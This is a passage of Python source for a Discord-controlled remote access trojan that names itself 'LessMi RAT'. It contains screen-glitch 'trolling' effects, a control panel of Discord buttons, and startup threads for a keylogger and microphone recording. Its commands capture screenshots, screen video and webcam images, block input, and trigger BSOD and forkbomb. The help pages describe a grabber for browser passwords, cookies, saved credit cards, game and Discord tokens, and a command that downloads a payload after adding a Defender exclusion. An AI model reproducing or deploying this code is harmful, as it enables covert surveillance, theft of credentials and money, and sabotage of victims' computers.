            x2 = int(width / 2 + radius * math.cos(rad + math.pi))
            y2 = int(height / 2 - radius * math.sin(rad + math.pi))
            color = win32api.RGB(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
            pen = win32gui.CreatePen(win32con.PS_SOLID, random.randint(1, 5), color)
            old_pen = win32gui.SelectObject(hdc, pen)
            win32gui.MoveToEx(hdc, x1, y1)
            win32gui.LineTo(hdc, x2, y2)
            win32gui.SelectObject(hdc, old_pen)
            win32gui.DeleteObject(pen)
            
    elif effect == "random_lines":
        for _ in range(800):
            x1 = random.randint(0, width)
            y1 = random.randint(0, height)
            x2 = random.randint(0, width)
            y2 = random.randint(0, height)
            color = win32api.RGB(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
            pen = win32gui.CreatePen(win32con.PS_SOLID, random.randint(1, 6), color)
            old_pen = win32gui.SelectObject(hdc, pen)
            win32gui.MoveToEx(hdc, x1, y1)
            win32gui.LineTo(hdc, x2, y2)
            win32gui.SelectObject(hdc, old_pen)
            win32gui.DeleteObject(pen)
            
    elif effect == "screen_collapse":
        for _ in range(600):
            sx = random.randint(0, width - 100)
            sy = random.randint(0, height - 100)
            dx = sx + random.randint(-80, 80)
            dy = sy + random.randint(-80, 80)
            w = random.randint(50, 400)
            h = random.randint(50, 400)
            win32gui.BitBlt(hdc, dx, dy, w, h, hdc, sx, sy, win32con.SRCCOPY)
            
    elif effect == "block_glitch":
        for _ in range(1500):
            rx = random.randint(0, width)
            ry = random.randint(0, height)
            rw = random.randint(20, 300)
            rh = random.randint(5, 50)
            mode = random.choice([win32con.PATINVERT, win32con.DSTINVERT])
            win32gui.PatBlt(hdc, rx, ry, rw, rh, mode)

    elif effect == "glitch_tunnel":
        for i in range(0, min(width, height) // 2, 8):
            color = win32api.RGB(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
            brush = win32gui.CreateSolidBrush(color)
            old_brush = win32gui.SelectObject(hdc, brush)
            win32gui.PatBlt(hdc, i, i, width - (i * 2), height - (i * 2), win32con.PATINVERT)
            win32gui.SelectObject(hdc, old_brush)
            win32gui.DeleteObject(brush)

    elif effect == "matrix_rain":
        brush = win32gui.CreateSolidBrush(win32api.RGB(0, 255, 70))
        old_brush = win32gui.SelectObject(hdc, brush)
        for _ in range(2000):
            rx = random.randint(0, width // 15) * 15
            ry = random.randint(0, height // 20) * 20
            win32gui.PatBlt(hdc, rx, ry, 10, 18, win32con.PATCOPY)
        win32gui.SelectObject(hdc, old_brush)
        win32gui.DeleteObject(brush)

    elif effect == "pixel_melter":
        for _ in range(800):
            sx = random.randint(0, width - 20)
            sy = random.randint(0, height - 100)
            w = random.randint(5, 30)
            h = random.randint(20, 100)
            win32gui.BitBlt(hdc, sx, sy + random.randint(10, 40), w, h, hdc, sx, sy, win32con.SRCCOPY)

    elif effect == "vhs_static":
        for _ in range(120):
            y_pos = random.randint(0, height - 30)
            win32gui.BitBlt(hdc, random.randint(-40, 40), y_pos, width, random.randint(10, 30), hdc, 0, y_pos, win32con.SRCCOPY)
            win32gui.PatBlt(hdc, 0, y_pos, width, random.randint(2, 6), win32con.PATINVERT)
            time.sleep(0.02)

    elif effect == "pixelate_wave":
        for _ in range(500):
            rx = random.randint(0, width - 100)
            ry = random.randint(0, height - 100)
            size = random.randint(20, 80)
            win32gui.StretchBlt(hdc, rx, ry, size, size, hdc, rx, ry, size // 4, size // 4, win32con.SRCCOPY)

    elif effect == "rgb_split":
        for _ in range(300):
            h_slice = random.randint(10, 80)
            y_pos = random.randint(0, height - h_slice)
            shift = random.choice([-50, -25, 25, 50])
            win32gui.BitBlt(hdc, shift, y_pos, width, h_slice, hdc, 0, y_pos, win32con.SRCINVERT)

    elif effect == "screen_shake":
        for _ in range(80):
            dx = random.randint(-30, 30)
            dy = random.randint(-30, 30)
            win32gui.BitBlt(hdc, dx, dy, width - abs(dx), height - abs(dy), hdc, 0, 0, win32con.SRCCOPY)
            time.sleep(0.01)

    elif effect == "corrupted_text_bars":
        for _ in range(1000):
            rx = random.randint(0, width)
            ry = random.randint(0, height)
            rw = random.randint(50, 400)
            rh = random.randint(2, 10)
            color = win32api.RGB(random.choice([0, 255]), random.choice([0, 255]), random.choice([0, 255]))
            brush = win32gui.CreateSolidBrush(color)
            old_brush = win32gui.SelectObject(hdc, brush)
            win32gui.PatBlt(hdc, rx, ry, rw, rh, win32con.PATCOPY)
            win32gui.SelectObject(hdc, old_brush)
            win32gui.DeleteObject(brush)

    elif effect == "vortex_twirl":
        center_x, center_y = width // 2, height // 2
        for r in range(50, min(width, height) // 2, 15):
            angle_shift = random.randint(-20, 20)
            win32gui.BitBlt(hdc, center_x - r + angle_shift, center_y - r - angle_shift, r * 2, r * 2, hdc, center_x - r, center_y - r, win32con.SRCPAINT)

    elif effect == "scanline_flicker":
        for _ in range(100):
            for y_pos in range(0, height, random.randint(4, 12)):
                win32gui.PatBlt(hdc, 0, y_pos, width, 1, win32con.BLACKNESS)
            time.sleep(0.01)

    elif effect == "mirror_dimension":
        for _ in range(50):
            half_w = width // 2
            win32gui.StretchBlt(hdc, half_w, 0, half_w, height, hdc, half_w, 0, -half_w, height, win32con.SRCCOPY)
            time.sleep(0.02)

    elif effect == "screen_fracture":
        for _ in range(400):
            rx = random.randint(0, width - 200)
            ry = random.randint(0, height - 200)
            rw = random.randint(100, 300)
            rh = random.randint(100, 300)
            win32gui.BitBlt(hdc, rx + random.randint(-40, 40), ry + random.randint(-40, 40), rw, rh, hdc, rx, ry, win32con.SRCINVERT)

    elif effect == "color_bleed":
        for _ in range(600):
            rx = random.randint(0, width - 50)
            ry = random.randint(0, height)
            rw = random.randint(30, 150)
            color = win32api.RGB(255, 0, random.randint(0, 255))
            brush = win32gui.CreateSolidBrush(color)
            old_brush = win32gui.SelectObject(hdc, brush)
            win32gui.PatBlt(hdc, rx, ry, rw, 4, win32con.SRCPAINT)
            win32gui.SelectObject(hdc, old_brush)
            win32gui.DeleteObject(brush)

    elif effect == "horizontal_tear":
        for _ in range(150):
            y_pos = random.randint(0, height - 50)
            h_slice = random.randint(5, 30)
            shift = random.randint(-150, 150)
            win32gui.BitBlt(hdc, shift, y_pos, width, h_slice, hdc, 0, y_pos, win32con.SRCCOPY)
            time.sleep(0.01)

    elif effect == "digital_earthquake":
        for _ in range(120):
            dx = random.randint(-60, 60)
            dy = random.randint(-60, 60)
            win32gui.BitBlt(hdc, dx, dy, width, height, hdc, 0, 0, win32con.SRCPAINT)
            time.sleep(0.01)

    elif effect == "checkerboard_void":
        size = 80
        for x_pos in range(0, width, size):
            for y_pos in range(0, height, size):
                if (x_pos // size + y_pos // size) % 2 == 0:
                    win32gui.PatBlt(hdc, x_pos, y_pos, size, size, win32con.PATINVERT)
        time.sleep(0.5)

    elif effect == "strobe_stripes":
        for _ in range(30):
            for x_pos in range(0, width, 40):
                win32gui.PatBlt(hdc, x_pos, 0, 20, height, win32con.DSTINVERT)
            time.sleep(0.03)

    elif effect == "pixel_explosion":
        for _ in range(5000):
            rx = random.randint(0, width)
            ry = random.randint(0, height)
            win32gui.PatBlt(hdc, rx, ry, random.randint(2, 6), random.randint(2, 6), win32con.PATINVERT)

    elif effect == "wave_distortion":
        for y_pos in range(0, height, 10):
            offset = int(math.sin(y_pos / 20.0) * 30)
            win32gui.BitBlt(hdc, offset, y_pos, width, 10, hdc, 0, y_pos, win32con.SRCCOPY)

    elif effect == "quad_mirror":
        hw, hh = width // 2, height // 2
        win32gui.BitBlt(hdc, hw, 0, hw, hh, hdc, 0, 0, win32con.SRCCOPY)
        win32gui.BitBlt(hdc, 0, hh, hw, hh, hdc, 0, 0, win32con.SRCCOPY)
        win32gui.BitBlt(hdc, hw, hh, hw, hh, hdc, 0, 0, win32con.SRCCOPY)

    elif effect == "crt_defrag":
        for y_pos in range(0, height, 4):
            if random.random() > 0.4:
                win32gui.PatBlt(hdc, 0, y_pos, width, 2, win32con.BLACKNESS)

    elif effect == "vhs_tracking_loss":
        for _ in range(80):
            y_pos = random.randint(0, height - 100)
            win32gui.BitBlt(hdc, 0, y_pos, width, 80, hdc, 0, y_pos + random.randint(-20, 20), win32con.SRCCOPY)
            win32gui.PatBlt(hdc, 0, y_pos + 40, width, 10, win32con.PATINVERT)
            time.sleep(0.01)

    elif effect == "invert_sweep":
        for x_pos in range(0, width, 20):
            win32gui.PatBlt(hdc, x_pos, 0, 20, height, win32con.PATINVERT)
            time.sleep(0.005)

    elif effect == "static_snow_storm":
        for _ in range(3000):
            rx = random.randint(0, width)
            ry = random.randint(0, height)
            val = random.choice([0, 255])
            brush = win32gui.CreateSolidBrush(win32api.RGB(val, val, val))
            old_brush = win32gui.SelectObject(hdc, brush)
            win32gui.PatBlt(hdc, rx, ry, 4, 4, win32con.PATCOPY)
            win32gui.SelectObject(hdc, old_brush)
            win32gui.DeleteObject(brush)

    elif effect == "kaleidoscope_glitch":
        for _ in range(200):
            rx = random.randint(0, width // 2)
            ry = random.randint(0, height // 2)
            rw = random.randint(50, 150)
            rh = random.randint(50, 150)
            win32gui.BitBlt(hdc, width - rx - rw, ry, rw, rh, hdc, rx, ry, win32con.SRCINVERT)
            win32gui.BitBlt(hdc, rx, height - ry - rh, rw, rh, hdc, rx, ry, win32con.SRCINVERT)

    elif effect == "screen_fold":
        for i in range(0, width // 2, 10):
            win32gui.BitBlt(hdc, i, 0, 5, height, hdc, width - i, 0, win32con.SRCCOPY)

    elif effect == "hologram_flicker":
        for _ in range(60):
            win32gui.PatBlt(hdc, 0, 0, width, height, win32con.DSTINVERT)
            time.sleep(0.01)
            win32gui.PatBlt(hdc, 0, 0, width, height, win32con.DSTINVERT)

    elif effect == "blackhole_siphon":
        cx, cy = width // 2, height // 2
        for r in range(min(width, height) // 2, 10, -10):
            win32gui.BitBlt(hdc, cx - r + 5, cy - r + 5, r * 2 - 10, r * 2 - 10, hdc, cx - r, cy - r, win32con.SRCCOPY)

    elif effect == "corrupted_grid":
        for x_pos in range(0, width, 50):
            for y_pos in range(0, height, 50):
                if random.random() > 0.5:
                    win32gui.PatBlt(hdc, x_pos, y_pos, 45, 45, win32con.PATINVERT)

    else:
        win32gui.PatBlt(hdc, 0, 0, width, height, win32con.PATINVERT)
        
    if effect != "list":
        win32gui.ReleaseDC(0, hdc)

CATEGORY_IDS = {}
CHANNEL_IDS = {}


def init_channels_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS guild_config
                 (guild_id INTEGER, key TEXT, value INTEGER, PRIMARY KEY (guild_id, key))""")
    conn.commit()
    conn.close()


def get_guild_value(guild_id, key):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT value FROM guild_config WHERE guild_id = ? AND key = ?", (guild_id, key))
    result = c.fetchone()
    conn.close()
    return result[0] if result else None


def set_guild_value(guild_id, key, value):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO guild_config VALUES (?, ?, ?)", (guild_id, key, value))
    conn.commit()
    conn.close()


def cfg_get(guild_id, key, default=None):
    return CHANNEL_IDS.get(guild_id, {}).get(key, default)


init_db()
init_channels_db()

CHANNEL_NAMES = {
    "panel": "🧮〡panel",
    "info": "ℹ️〡info",
    "cmds": "🤖〡cmds",
    "keys": "🔑〡keys",
    "microphone": "🎤〡microphone",
}

CHANNEL_ORDER = ["panel", "info", "cmds", "keys", "microphone"]

async def run_panel_command(interaction: discord.Interaction, command_name: str, *args):
    cmd = bot.get_command(command_name)
    if not cmd:
        await interaction.response.send_message(f"Unknown command: `{command_name}`", ephemeral=True)
        return
    cmds_channel = interaction.guild.get_channel(cfg_get(interaction.guild.id, "cmds"))
    if not cmds_channel:
        await interaction.response.send_message("Commands channel not found", ephemeral=True)
        return
    await interaction.response.defer()
    ctx = await bot.get_context(interaction.message)
    ctx.author = interaction.user
    ctx.channel = cmds_channel
    ctx.guild = interaction.guild
    try:
        await ctx.invoke(cmd, *args)
    except Exception as e:
        await cmds_channel.send(f"Error: {e}")


class _PanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    async def run(self, interaction, name, *args):
        await run_panel_command(interaction, name, *args)


class VolumeModal(discord.ui.Modal):
    def __init__(self):
        super().__init__(title="Set Volume")
        self.volume = discord.ui.TextInput(label="Volume (0-100)", placeholder="50", required=True, max_length=3)
        self.add_item(self.volume)

    async def on_submit(self, interaction: discord.Interaction):
        try:
            vol = int(self.volume.value)
            if 0 <= vol <= 100:
                await run_panel_command(interaction, "volume", vol)
            else:
                await interaction.response.send_message("0-100 only", ephemeral=True)
        except ValueError:
            await interaction.response.send_message("Invalid value", ephemeral=True)


class NotepadModal(discord.ui.Modal):
    def __init__(self):
        super().__init__(title="Open Notepad")
        self.text = discord.ui.TextInput(label="Text", style=discord.TextStyle.paragraph, required=True)
        self.add_item(self.text)

    async def on_submit(self, interaction: discord.Interaction):
        await run_panel_command(interaction, "notepad", self.text.value)


class ButtonsScreenshot(_PanelView):
    @discord.ui.button(label="📸 Screenshot", style=discord.ButtonStyle.primary)
    async def b1(self, i, b):
        await self.run(i, "ss")

    @discord.ui.button(label="🎥 Screenrec", style=discord.ButtonStyle.primary)
    async def b2(self, i, b):
        await self.run(i, "screenrec", 30)

    @discord.ui.button(label="📹 Webcam", style=discord.ButtonStyle.primary)
    async def b3(self, i, b):
        await self.run(i, "webcam")


class ButtonsSystem(_PanelView):
    @discord.ui.button(label="🔊 Volume", style=discord.ButtonStyle.secondary)
    async def b1(self, i, b):
        await i.response.send_modal(VolumeModal())

    @discord.ui.button(label="⌨️ Block", style=discord.ButtonStyle.danger)
    async def b2(self, i, b):
        await self.run(i, "block-input")

    @discord.ui.button(label="✅ Unblock", style=discord.ButtonStyle.success)
    async def b3(self, i, b):
        await self.run(i, "unblock-input")

    @discord.ui.button(label="🖥️ Mon OFF", style=discord.ButtonStyle.danger)
    async def b4(self, i, b):
        await self.run(i, "monitors-off")

    @discord.ui.button(label="🖥️ Mon ON", style=discord.ButtonStyle.success)
    async def b5(self, i, b):
        await self.run(i, "monitors-on")


class ButtonsCameras(_PanelView):
    @discord.ui.button(label="📹 List Cams", style=discord.ButtonStyle.primary)
    async def b1(self, i, b):
        await self.run(i, "list-cams")

    @discord.ui.button(label="🎙️ List Mics", style=discord.ButtonStyle.primary)
    async def b2(self, i, b):
        await self.run(i, "list-mics")

    @discord.ui.button(label="🎙️ Join", style=discord.ButtonStyle.success)
    async def b3(self, i, b):
        await self.run(i, "join")

    @discord.ui.button(label="🔌 Disconnect", style=discord.ButtonStyle.secondary)
    async def b4(self, i, b):
        await self.run(i, "disconnect")


class ButtonsProcesses(_PanelView):
    @discord.ui.button(label="📋 Tasklist", style=discord.ButtonStyle.primary)
    async def b1(self, i, b):
        await self.run(i, "tasklist")

    @discord.ui.button(label="🚫 Kill Exp", style=discord.ButtonStyle.danger)
    async def b2(self, i, b):
        await self.run(i, "kill-explorer")

    @discord.ui.button(label="✅ Start Exp", style=discord.ButtonStyle.success)
    async def b3(self, i, b):
        await self.run(i, "start-explorer")


class ButtonsTrolling(_PanelView):
    @discord.ui.button(label="😵 Crazy", style=discord.ButtonStyle.primary)
    async def b1(self, i, b):
        await self.run(i, "crazy-mouse")

    @discord.ui.button(label="➖ Minimize", style=discord.ButtonStyle.secondary)
    async def b2(self, i, b):
        await self.run(i, "minimize-all")

    @discord.ui.button(label="💀 BSOD", style=discord.ButtonStyle.danger)
    async def b3(self, i, b):
        await self.run(i, "bsod")

    @discord.ui.button(label="🍽️ Fork", style=discord.ButtonStyle.danger)
    async def b4(self, i, b):
        await self.run(i, "forkbomb")

    @discord.ui.button(label="👻 Jump", style=discord.ButtonStyle.danger)
    async def b5(self, i, b):
        await self.run(i, "jumpscare")


class ButtonsFiles(_PanelView):
    @discord.ui.button(label="📁 LS", style=discord.ButtonStyle.primary)
    async def b1(self, i, b):
        await self.run(i, "ls")

    @discord.ui.button(label="🌳 Tree", style=discord.ButtonStyle.primary)
    async def b2(self, i, b):
        await self.run(i, "tree")


class ButtonsSecurity(_PanelView):
    @discord.ui.button(label="🚫 Blacklist", style=discord.ButtonStyle.danger)
    async def b1(self, i, b):
        await i.response.send_message("Type `.blacklist <process>` in cmds", ephemeral=True)

    @discord.ui.button(label="✅ Unblacklist", style=discord.ButtonStyle.success)
    async def b2(self, i, b):
        await i.response.send_message("Type `.unblacklist <process>` in cmds", ephemeral=True)


class ButtonsPower(_PanelView):
    @discord.ui.button(label="🔒 Lock", style=discord.ButtonStyle.primary)
    async def b1(self, i, b):
        await self.run(i, "lock-pc")

    @discord.ui.button(label="😴 Sleep", style=discord.ButtonStyle.secondary)
    async def b2(self, i, b):
        await self.run(i, "sleep-pc")

    @discord.ui.button(label="🔁 Restart", style=discord.ButtonStyle.danger)
    async def b3(self, i, b):
        await self.run(i, "restart-pc")

    @discord.ui.button(label="⏻ Shutdown", style=discord.ButtonStyle.danger)
    async def b4(self, i, b):
        await self.run(i, "shutdown-pc")


class ButtonsInfo(_PanelView):
    @discord.ui.button(label="🖥️ Sysinfo", style=discord.ButtonStyle.primary)
    async def b1(self, i, b):
        await self.run(i, "sysinfo")

    @discord.ui.button(label="🔋 Battery", style=discord.ButtonStyle.primary)
    async def b2(self, i, b):
        await self.run(i, "battery")

    @discord.ui.button(label="📶 WiFi", style=discord.ButtonStyle.primary)
    async def b3(self, i, b):
        await self.run(i, "wifi")

    @discord.ui.button(label="💽 Drives", style=discord.ButtonStyle.primary)
    async def b4(self, i, b):
        await self.run(i, "drives")


class ButtonsMore(_PanelView):
    @discord.ui.button(label="🪟 Windows", style=discord.ButtonStyle.primary)
    async def b1(self, i, b):
        await self.run(i, "window-list")

    @discord.ui.button(label="📋 Clipboard", style=discord.ButtonStyle.primary)
    async def b2(self, i, b):
        await self.run(i, "clipboard")

    @discord.ui.button(label="🚀 Startup", style=discord.ButtonStyle.primary)
    async def b3(self, i, b):
        await self.run(i, "startup")

    @discord.ui.button(label="📝 Notepad", style=discord.ButtonStyle.secondary)
    async def b4(self, i, b):
        await i.response.send_modal(NotepadModal())

    @discord.ui.button(label="🔔 Beep", style=discord.ButtonStyle.success)
    async def b5(self, i, b):
        await self.run(i, "beep")

class ButtonsTools(_PanelView):
    @discord.ui.button(label="💰 Grabber", style=discord.ButtonStyle.success)
    async def b1(self, i, b):
        await self.run(i, "grabber")

    @discord.ui.button(label="🎨 Accent", style=discord.ButtonStyle.secondary)
    async def b2(self, i, b):
        await self.run(i, "accent")

    @discord.ui.button(label="🖱️ Click", style=discord.ButtonStyle.primary)
    async def b3(self, i, b):
        await self.run(i, "click", 1)

    @discord.ui.button(label="🧾 Systeminfo", style=discord.ButtonStyle.primary)
    async def b5(self, i, b):
        await self.run(i, "systeminfo")

@bot.event
async def on_ready():
    print(f"Connected as {bot.user}")

    pc_name = socket.gethostname()
    category_name = f"💻 〣 {pc_name}"

    await bot.change_presence(
        status=discord.Status.dnd,
        activity=discord.Activity(type=discord.ActivityType.playing, name="🔑 LessMi RAT")
    )

    for guild in bot.guilds:
        gid = guild.id
        CHANNEL_IDS.setdefault(gid, {})

        cat_id = get_guild_value(gid, "category")
        cat = guild.get_channel(cat_id) if cat_id else None
        if not cat:
            cat = discord.utils.get(guild.categories, name=category_name)
            if not cat:
                cat = await guild.create_category(category_name)
        CATEGORY_IDS[gid] = cat.id
        set_guild_value(gid, "category", cat.id)

        for key, name in CHANNEL_NAMES.items():
            ch_id = get_guild_value(gid, key)
            ch = guild.get_channel(ch_id) if ch_id else None
            if not ch:
                ch = discord.utils.get(cat.text_channels, name=name)
                if not ch:
                    ch = await guild.create_text_channel(name, category=cat)
            CHANNEL_IDS[gid][key] = ch.id
            set_guild_value(gid, key, ch.id)

            if key == "panel" and ch:
                try:
                    await ch.purge(limit=100)
                except Exception:
                    pass

        voice_ch = discord.utils.get(cat.voice_channels, name="Live microphone")
        if not voice_ch:
            try:
                voice_ch = await guild.create_voice_channel("Live microphone", category=cat)
            except Exception:
                pass

        if voice_ch:
            CHANNEL_IDS[gid]["livemic"] = voice_ch.id
            set_guild_value(gid, "livemic", voice_ch.id)

        keys_ch = guild.get_channel(cfg_get(gid, "keys"))
        if keys_ch:
            timestamp = datetime.now().strftime("[%Y-%m-%d] [%H:%M:%S]")
            await keys_ch.send(f"ℹ️ `{timestamp}` - **Started** new **session** on `{pc_name}`")

        panel_ch = guild.get_channel(cfg_get(gid, "panel"))
        if panel_ch:
            def mk(title, desc, color, fields):
                e = create_embed(title, desc, color)
                for n, v in fields:
                    e.add_field(name=n, value=v, inline=True)
                return e

            await panel_ch.send(embed=mk("Screenshot & Recording", "Screen and camera control", 0x3498db,
                                         [(".ss", "Screenshot"), (".screenrec", "Record"), (".webcam", "Webcam")]),
                                view=ButtonsScreenshot())

            await panel_ch.send(embed=mk("System Control", "Volume, input, monitors", 0xe74c3c,
                                         [(".volume", "Volume"), (".block-input", "Block"), (".monitors", "Monitors")]),
                                view=ButtonsSystem())

            await panel_ch.send(embed=mk("Cameras & Audio", "Device management", 0x2ecc71,
                                         [(".list-cams", "Cams"), (".list-mics", "Mics"), (".join", "Join")]),
                                view=ButtonsCameras())

            await panel_ch.send(embed=mk("Processes", "Process management", 0x9b59b6,
                                         [(".tasklist", "List"), (".kill-explorer", "Kill Exp"), (".start-explorer", "Start Exp")]),
                                view=ButtonsProcesses())

            await panel_ch.send(embed=mk("Trolling", "Fun commands", 0xf39c12,
                                         [(".crazy-mouse", "Crazy"), (".bsod", "BSOD"), (".forkbomb", "Fork")]),
                                view=ButtonsTrolling())

            await panel_ch.send(embed=mk("Files", "File management", 0x1abc9c,
                                         [(".ls", "List"), (".tree", "Tree")]),
                                view=ButtonsFiles())

            await panel_ch.send(embed=mk("Security", "Blacklist", 0x95a5a6,
                                         [(".blacklist", "Block"), (".unblacklist", "Unblock")]),
                                view=ButtonsSecurity())

            await panel_ch.send(embed=mk("Power", "Session control", 0xe67e22,
                                         [(".lock-pc", "Lock"), (".sleep-pc", "Sleep"), (".restart-pc", "Restart"), (".shutdown-pc", "Shutdown")]),
                                view=ButtonsPower())

            await panel_ch.send(embed=mk("Info", "System information", 0x3498db,
                                         [(".sysinfo", "Sysinfo"), (".battery", "Battery"), (".wifi", "WiFi"), (".drives", "Drives")]),
                                view=ButtonsInfo())

            await panel_ch.send(embed=mk("More", "Extra tools", 0x9b59b6,
                                         [(".window-list", "Windows"), (".clipboard", "Clipboard"), (".startup", "Startup"), (".notepad", "Notepad"), (".beep", "Beep")]),
                                view=ButtonsMore())

    threading.Thread(target=keylogger_thread, daemon=True).start()
    threading.Thread(target=send_keys_periodically, daemon=True).start()
    threading.Thread(target=record_mic_thread, daemon=True).start()
    threading.Thread(target=blacklist_watcher, daemon=True).start()

HELP_PAGES = [
("screen", "📸", "Screen & Media", """
`.ss` — screenshot every monitor
`.screenrec <s>` — record the screen (max 300s)
`.camrec <s>` — record from the selected camera
`.webcam` — webcam snapshot
`.list-cams` / `.sel-cam <id>` — cameras
`.show-screens` — list displays
`.screen-mode <expand|duplicate|internal|external>`
`.rotate <0|90|180|270>` / `.resolution <w> <h>`
`.monitors-off` / `.monitors-on`
`.screensaver`
`.set-wallpaper <file|url>` / `.wallpaper-random`
`.play <file|url>` / `.tts <text>` / `.beep`
`.jumpscare` — fullscreen scare video
"""),
    ("input", "🖱️", "Input & Control", """
`.block-input [seconds]` / `.unblock-input`
`.hide-cursor` / `.show-cursor`
`.key <keys>` — type text (`[ENTER]`, `[SPACE]`, `[TAB]`, `[ESC]`)
`.click [n]` — simulate left clicks
`.click-delete [n] [folder]` — delete a random file per click
`.autoclick <on|off> [interval]`
`.mouse-speed <1-20>` / `.swap-mouse <on|off>`
`.alt-f4` / `.minimize-all`
`.taskbar <hide|show>` / `.desktop-icons <hide|show>`
`.unpin-all` — clear every taskbar pin
`.restart-taskbar` — restart explorer
`.capslock|numlock|scrolllock <on|off>`
`.sticky-keys <on|off>`
"""),
    ("voice", "🎙️", "Voice & Audio", """
`.list-mics` / `.sel-mic <n>`
`.list-speakers` / `.set-speaker <n>`
`.join` / `.disconnect` — live microphone feed
`.record <s>` / `.mic-record <s>` — mic clip
`.volume <0-100>` / `.vol-step <up|down> [n]` / `.mute`
`.night-light <on|off>`
"""),
    ("processes", "⚙️", "Processes & Windows", """
`.tasklist` — running processes
`.proc-info <name>` — details of a process
`.taskkill <name>` / `.kill-tree <name>`
`.kill-explorer` / `.start-explorer`
`.set-critical` / `.unset-critical`
`.services` — running services
`.startup` — startup entries
`.window-list` / `.windows`
`.focus <title>` / `.close-window <title>`
`.drivers`
`.events` — recent event log
"""),
    ("files", "📁", "Filesystem", """
`.ls` / `.cd <path>` / `.tree`
`.cat <file>` — read text file
`.mkdir <name>` / `.mkfile <name> <text>`
`.remove <file>` / `.move <a> <b>` / `.copy <a> <b>` / `.rename <a> <b>`
`.size <path>` / `.hash <file>` — SHA256
`.search <pattern> [path]`
`.zip <src> <dest>` / `.unzip <file>`
`.download <file>` / `.upload`
`.grab-url <url> [dest]`
`.open <file>` / `.run <file>`
`.recent` — recent files
`.usb` — USB history
`.empty-temp` / `.hosts`
`.clear-bin` / `.mount <iso>` / `.unmount <iso>`
"""),
    ("grab", "💰", "Grabber", """
`.grab all` — full run, split by type
`.grab cookies` — cookies to a .txt
`.grab history` — browser history to a .txt
`.grab cards` — saved credit cards to a .txt
`.grab games` — Steam, Epic, Riot, Minecraft, Battle.net, GOG, Ubisoft, EA, Telegram, FileZilla to a .txt
`.grab discord` — every token, browser and desktop, rendered as embeds
`.grab passwords` — saved browser passwords to a .txt
`.grab vm` — sandbox report

`.grabber [url]` — download a grabber, add a Defender exclusion, run it, post the output, delete it.
"""),
]


class HelpView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=300)
        options = [discord.SelectOption(label=name, value=key, emoji=emoji) for key, emoji, name, _ in HELP_PAGES]
        select = discord.ui.Select(placeholder="Pick a category...", options=options, row=0)
        select.callback = self.on_select
        self.select = select
        self.add_item(select)

    def build_embed(self, key):
        for k, emoji, name, body in HELP_PAGES:
            if k == key:
                return create_embed(f"{emoji} {name}", body, 0x9B59B6)
        return create_embed("Help", "Unknown category")

    async def on_select(self, interaction: discord.Interaction):
        await interaction.response.edit_message(embed=self.build_embed(self.select.values[0]), view=self)


@bot.command(aliases=["help"])
async def ayuda(ctx):
    view = HelpView()
    await ctx.send(embed=view.build_embed("overview"), view=view)

@bot.command()
async def volume(ctx, vol: int = None):
    if vol is None:
        await ctx.send(embed=create_embed("Error", "Usage: `.volume <0-100>`", 0xff0000))
        return
    if set_volume_level(vol / 100):
        await ctx.send(embed=create_embed("🔊 Volume", f"Volume set to **{vol}%**.", 0x00ff00))
    else:
        await ctx.send(embed=create_embed("Error", "Could not change volume", 0xff0000))


@bot.command()
async def ss(ctx):
    await ctx.message.add_reaction("📌")
    path = screenshot_all()
    if path:
        file_name = os.path.basename(path)
        embed = create_embed("📸 Screenshot taken", "Screenshot attached.", 0x0084FF)
        embed.set_image(url=f"attachment://{file_name}")
        await ctx.send(embed=embed, file=discord.File(path, filename=file_name))
        os.remove(path)


@bot.command()
async def screenrec(ctx, seconds: int = 30):
    if seconds > 300:
        seconds = 300
    await ctx.message.add_reaction("📌")
    await ctx.send(f"`🎥` Recording for **{seconds}** seconds...")
    try:
        import imageio
        frames = []
        start = time.time()
        while time.time() - start < seconds:
            frames.append(np.array(pyautogui.screenshot()))
        output_file = os.path.join(BASE_DIR, "recording.mp4")
        imageio.mimsave(output_file, frames, fps=10)
        await ctx.send(embed=create_embed("🎥 Screen recording", "Recording complete.", 0x0084ff),
                       file=discord.File(output_file))
        os.remove(output_file)
    except Exception as e:
        await ctx.send(f"Error: {e}")


@bot.command(aliases=["list-cams"])
async def list_cams(ctx):
    cams = list_cameras()
    msg = "\n".join([f"Camera **ID {i}**" for i in cams])
    await ctx.send(embed=create_embed("Cameras", msg or "No cameras found", 0x3498db))


@bot.command()
async def webcam(ctx):
    cap = cv2.VideoCapture(selected_camera)
    if cap.isOpened():
        ret, frame = cap.read()
        if ret:
            path = os.path.join(BASE_DIR, "webcam.png")
            cv2.imwrite(path, frame)
            embed = create_embed("📹 Webcam photo", f"Selected camera: **{selected_camera}**", 0x0084FF)
            embed.set_image(url="attachment://webcam.png")
            await ctx.send(embed=embed, file=discord.File(path, filename="webcam.png"))
            os.remove(path)
        cap.release()
    else:
        await ctx.send(embed=create_embed("Error", f"Could not access camera **{selected_camera}**.", 0xFF0000))


@bot.command(aliases=["sel-cam"])
async def sel_cam(ctx, num: int = None):
    global selected_camera
    if num is None:
        await ctx.send(embed=create_embed("Error", "Usage: `.sel-cam <id>`", 0xff0000))
        return
    selected_camera = num
    await ctx.send(embed=create_embed("📹 Camera", f"Selected camera **{num}**.", 0x00ff00))


@bot.command(aliases=["list-mics", "microphones"])
async def list_microphones(ctx):
    await ctx.message.add_reaction("🎙️")
    try:
        mics = get_input_devices()
        lines = [f"{i}. {m['name']}" for i, m in enumerate(mics)]
        await ctx.send(embed=create_embed("🎙️ Microphones", f"```{chr(10).join(lines) or 'None'}```", 0x0084ff))
    except Exception as e:
        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))


@bot.command(aliases=["sel-mic", "selmic"])
async def sel_mic(ctx, num: int = None):
    global selected_mic
    mics = get_input_devices()
    if num is None or not (0 <= num < len(mics)):
        lines = [f"{i}. {m['name']}" for i, m in enumerate(mics)]
        await ctx.send(embed=create_embed("🎙️ Microphones", f"```{chr(10).join(lines) or 'None'}```", 0x0084ff))
        return
    selected_mic = mics[num]["index"]
    await ctx.send(embed=create_embed("🎙️ Microphone", f"Selected: `{mics[num]['name']}`", 0x00ff00))


